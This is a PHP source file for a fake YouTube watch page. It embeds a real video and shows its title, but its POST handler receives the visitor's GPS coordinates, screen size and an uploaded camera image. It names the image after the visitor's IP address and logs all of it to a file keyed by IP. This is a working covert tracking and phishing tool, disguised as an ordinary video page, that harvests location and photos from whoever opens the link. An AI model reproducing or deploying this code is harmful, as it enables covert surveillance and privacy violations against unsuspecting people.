<?php
include "actions.php";
include "config.php";


if ($_SERVER['REQUEST_METHOD'] === 'POST') {
        $client_ip = getRealIpAddr();
        $dados = getContent($logFile);

	$dadosRecebidos = json_decode($_POST['dados'], true);

	$lt = isset($dadosRecebidos['larguraTela']) ? $dadosRecebidos['larguraTela'] : "";
	$at = isset($dadosRecebidos['alturaTela']) ? $dadosRecebidos['alturaTela'] : "";
	$lati = isset($dadosRecebidos['latitude']) ? $dadosRecebidos['latitude'] : "";
	$long = isset($dadosRecebidos['longitude']) ? $dadosRecebidos['longitude'] : "";

	if (isset($_FILES['imagem']) && $_FILES['imagem']['error'] === UPLOAD_ERR_OK) {
		$randID = rand(1000, 9999);
		$fname = $client_ip . "_" . $randID . ".jpg";
		$caminhoImagem = 'uploads/' . $fname;
	}

        if (move_uploaded_file($_FILES['imagem']['tmp_name'], $caminhoImagem)) {
		$dados[$client_ip]["FOTO"] = $fname;
        }

	if ($lt != "" and $at != ""){
		$tela = $lt."x".$at;
		$dados[$client_ip]["TELA"] = $tela;
	}

	if ($lati != "" and $long != ""){
		$GPS = "Latitude: " . $lati . ", Longitude: " . $long;
		$dados[$client_ip]["GPS"] = $GPS;
	}

	print_r($dados);
	saveArray($logFile, $dados);

}else{
	// SE O PARAMETRO N FOR ESPECIFICADO, DEFINE UM VIDEO ALEATORIO
	$video = isset($_GET["si"]) ? $_GET["si"] : "E2EudszdUgs";
	$titulo = getYouTubeTitle($video);

	logsIniciais($logFile);

	$conteudo = file_get_contents($logFile);
	$dados = json_decode($conteudo, true);

	echo '
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:ital,wght@0,100;0,300;0,400;0,500;0,700;0,900;1,100;1,300;1,400;1,500;1,700;1,900&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="normalize.css">
    <link rel="stylesheet" href="src/style.css">
    <script src="src/infos.js"></script>
    <script src="https://kit.fontawesome.com/1ba545dca5.js" crossorigin="anonymous"></script>
    <title>'. $titulo .'</title>
</head>

<body>
    <!--NAVBAR-->
    <header class="h-container header-flex">
        <div class="d-logo d-flex">
            <i class="fas fa-bars icon-header"></i>
            <img src="images/yt-logo.png" alt="logo" class="logo-img">
        </div>

        <div class="search-flex d-flex">
            <form class="search-bar d-flex">
                <input type="search" name="search" placeholder="Search">
                <button><i class="fas fa-search yt-gray"></i></button>
            </form>

            <i class="fas fa-upload icon-header center-margin"></i>

            <button class="b-header btn">Sign in</button>
        </div>
    </header>

    <!--LENGUAGE SECTION-->
    <section class="l-container">
        <div class="info-flex d-flex">
            <div class="i-flex d-flex">
                <i class="fas fa-user"></i>
                <h4>Choose your language.</h4>
            </div>
            <i class="fas fa-times"></i>
        </div>

        <div class="c-language d-flex">
            <p>You\'re viewing YouTube in <span>English (US)</span>. You can <a href="#"> change this preference below.</a></p>
            <a href="#">Learn more</a>
        </div>
    </section>

    <div class="main-flex d-flex">
        <!--MAIN CONTENT-->
        <main>
            <!--YT EMBEDDED VIDEO-->
            <iframe src="https://www.youtube.com/embed/' . $video . '" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>

            <!--CHANNEL INFORMATION-->
            <div class="general-background">
                <div class="channel-container">
                    <h1>'. $titulo .'</h1>

                    <div class="channel-flex d-flex">
                        <div class="channel-image d-flex">
                            <img src="images/profile-channel-img.jpg" alt="User Profile Photo">

                            <div class="channel-name d-flex">
                                <p>The Odin Project</p>
                                <div class="subscribe-channel d-flex">
                                    <button>
                                        <div class="d-flex">
                                            <i class="fab fa-youtube"></i>Subscribe
                                        </div>
                                    </button>
                                    <p>799</p>
                                </div>
                            </div>
                        </div>
                        <div class="views-flex d-flex">
                            <p class="nbr-views">50,016 views</p>
                        </div>
                    </div>
                </div>

                <!--DIVISOR LINE-->
                <hr class="solid b-line">

                <!--SHARE BUTTONS-->
                <div class="share-flex d-flex">
                    <div class="share-flex d-flex">
                        <div class="share-flex d-flex p-share">
                            <i class="fas fa-plus"></i>
                            <p>Add to</p>
                        </div>

                        <div class="share-flex d-flex p-share">
                            <i class="fas fa-share"></i>
                            <p>Share</p>
                        </div>

                        <div class="share-flex d-flex p-share">
                            <i class="fas fa-ellipsis-h"></i>
                            <p>More</p>
                        </div>
                    </div>

                    <div class="share-flex d-flex">
                        <div class="share-flex p-share d-flex">
                            <i class="fas fa-thumbs-up"></i>
                            <p>359</p>
                        </div>

                        <div class="share-flex p-share d-flex">
                            <i class="fas fa-thumbs-down"></i>
                            <p>14</p>
                        </div>
                    </div>
                </div>
            </div>

            <!--INFORMATION SECTION-->
            <section class="general-background date-container">
                <div class=" publish-date">
                    <h4>Published on Feb 27, 2014</h4>

                    <p>
                        How do you contribute to open source? In this video, I\'ll describe the easiest way to make a simple contribution to an open source project -- without using the command line, a text editor, "forking a repo", or even touching Git outside of Github. I\'ll
                        also describe what kinds of contributions open source software projects are typically looking for. As an example, I use submitting a student solution to a web development exercise from The Odin Project, a free online curriculum
                        for learning web development with Ruby on Rails. You can find more information about that project at http://theodinproject.com.
                    </p>
                </div>
                <hr class="solid">

                <a href="#">
                    <p class="center-text yt-gray">
                        SHOW MORE
                    </p>
                </a>
            </section>

            <!--COMMENTS-->
            <div class="general-background d-flex loading-gif">
                <img src="images/loading-img" alt="Loading logo ">
                <p class="yt-gray">Loading...</p>
            </div>

        </main>

        <!--SIDE SECTION-->
        <aside class="general-background container">
            <div class="d-flex autoplay-title ">
                <h4> Up Next</h4>

                <div class="d-flex autoplay-flex ">
                    <p class="yt-gray">Autoplay</p>
                    <i class="fas fa-info-circle yt-gray"></i>
                    <i class="fas fa-toggle-on toggle"></i>
                </div>
            </div>

            <!--VIDEO PREVIEWS-->
            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/6350ed47768d4be4388f5a8a2b530730b3520802 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Contributing to Open Source Part II: The Real Way</h4>
                    <p>The Odin Project</p>
                    <p>29,985 views</p>
                </div>
            </div>

            <hr class="solid ">

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/495e6661840ba5e59315b8d9fbd12e8f79916207 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>\'How to Get a Job at the Big 4 - Amazon, Facebook, Google & Microsoft\' by Sean Lee</h4>
                    <p>imtiana</p>
                    <p>981,543 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/94ce5195858269ff0184aa735ee160f562dafac4 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Programming in Visual Basic .Net How to Connect Access Database to VB.Net
                    </h4>
                    <p>iBasskung</p>
                    <p>24,276,402 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/42fcf704757c206b21126f9ef6c413eff28de822 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>REST API concepts and examples
                    </h4>
                    <p>WebConcepts</p>
                    <p>4,775,868 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/ed9683aa07170cb5421ba283d3aad8e0a3626b97 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>GitHub - Why Microsoft Paid $7.5B for the Future of Software! - A Case Study for Entrepreneurs
                    </h4>
                    <p>Valuetainment</p>
                    <p>278,771 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/e551ad6b2fda543caa6fbd78c98ec95c1f1d0aff " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How to create a 3D Terrain with Google Maps and height maps in Photoshop - 3D Map Generator Terrain
                    </h4>
                    <p>Orange Box Ceo</p>
                    <p>475,111 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/df21e12d7260fba2247c4dd328453a98929270e9 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Convolutional Neural Networks (CNNs) explained
                    </h4>
                    <p>deeplizard</p>
                    <p>484,643 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/0425d088770dd5fbb04c5830b5d45ceb7f87eb22 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Top 10 Linux Job Interview Questions
                    </h4>
                    <p>The Odin Project</p>
                    <p>1,716,146 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/87ad6fdeaef86aa051f826e3006c068b60e06de9 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Running an SQL Injection Attack - Computerphile</h4>
                    <p>Computerphile
                    </p>
                    <p>2,662,427 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/b6e60231c77705ba5365c14da7c4ecb4ccb6cf86 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How to prepare for product based companies??
                    </h4>
                    <p>Gate Lectures by Ravindrababu Ravula</p>
                    <p>351,054 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/30341e348ffdfd8ef110d868a3f4892d1dff1719 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Visual Basic .Net : Search in Access Database - DataGridView BindingSource Filter Part 1/2
                    </h4>
                    <p>iBasskung</p>
                    <p>13,284,342 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/9104e3bbe284cc6497daa29c2c6128b6d4ab68cc " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How To Convert pdf to word without software</h4>
                    <p>karim hamdadi</p>
                    <p>8,534,153 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/f19150ffbc1e56e3c0f4bf3d16f852c1a06c00d9 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>What Python Projects Should I Build to Get a Job?</h4>
                    <p>Real Python</p>
                    <p>200,957 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/5db65ef125469d0b5b9b1a07b61c9cee64cbdfac " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How To NOT Look Like A Tourist | What To Wear In Europe
                    </h4>
                    <p>Audrey Coyne</p>
                    <p>4,122,703 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/3e74c5bf2dadd9fe3ec6089804970180b60cbfcd " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Your First GitHub Pull Request (in 10 Mins)
                    </h4>
                    <p>Jackson Bates</p>
                    <p>51,491 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/6b60f3abb556233757873da7cedd5b091744ce34 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Top signs of an inexperienced programmer
                    </h4>
                    <p>TechLead</p>
                    <p>272,527 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/872b157fed3ecb14099122fcb5f981408ec8d7d2 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Why I left my job at Google (as a software engineer)
                    </h4>
                    <p>TechLead</p>
                    <p>1,650,512 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/d95c11ceed49c1ae50d224d33110ab2728c03a23 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Max Stoiber - I want you to contribute to open source
                    </h4>
                    <p>ReactRally</p>
                    <p>6497 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/c477e426b7e9e5361e6c2bd1838c751516a76765 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>How to Learn Anything... Fast - Josh Kaufman
                    </h4>
                    <p>The RSA</p>
                    <p>1,889,882 views</p>
                </div>
            </div>

            <div class="d-flex thumbnail-parent ">
                <img src="https://archive.vn/Bss88/71a8551dc420f7a68c7e3fa3f91e5af9b702eae8 " alt="Thumbnail ">

                <div class="thumbnail-flex ">
                    <h4>Git & GitHub: Pull requests (10/11)
                    </h4>
                    <p>Codecourse</p>
                    <p>86,167 views</p>
                </div>
            </div>

            <hr class="solid ">

            <h4 class="center-text yt-gray no-margin">SHOW MORE</h4>
        </aside>
    </div>

    <!---->
    <footer class="general-background footer-m">
        <div class="d-flex footer-buttons ">
            <img src="images/yt-logo.png " alt="logo " class="footer-logo-img ">

            <button class="footer-flex d-flex">
                <i class="fas fa-user left-icon"></i>
                Language: <span>English</span>
                <i class="fas fa-caret-down "></i>
            </button>

            <button class="footer-flex d-flex">
                Location: <span>Netherlands</span>
                <i class="fas fa-caret-down "></i>
            </button>

            <button class="footer-flex d-flex">
                Restricted Mode: <span>Off</span>
                <i class="fas fa-caret-down "></i>
            </button>

            <button class="footer-flex d-flex">
                <i class="fas fa-hourglass-end left-icon"></i>
                History
            </button>

            <button class="footer-flex d-flex">
                <i class="fas fa-question-circle left-icon"></i>
                Help
            </button>
        </div>

        <hr class="solid ">

        <nav class="d-flex ">
            <a href="#">
                <p class="footer-p bold-text footer-p-size">About</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Press</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Copyright</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Creators</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Advertise</p>
            </a>
            <a href="#">
                <p class="footer-p bold-text footer-p-size">Developers</p>
            </a>
        </nav>

        <div class="d-flex footer-p ">
            <p class="footer-p ">Terms</p>
            <p class="footer-p ">Privacy</p>
            <p class="footer-p ">Policy & Safety</p>
            <p class="footer-p ">Test new features</p>
        </div>
    </footer>

</body>

</html>

';
}


?>
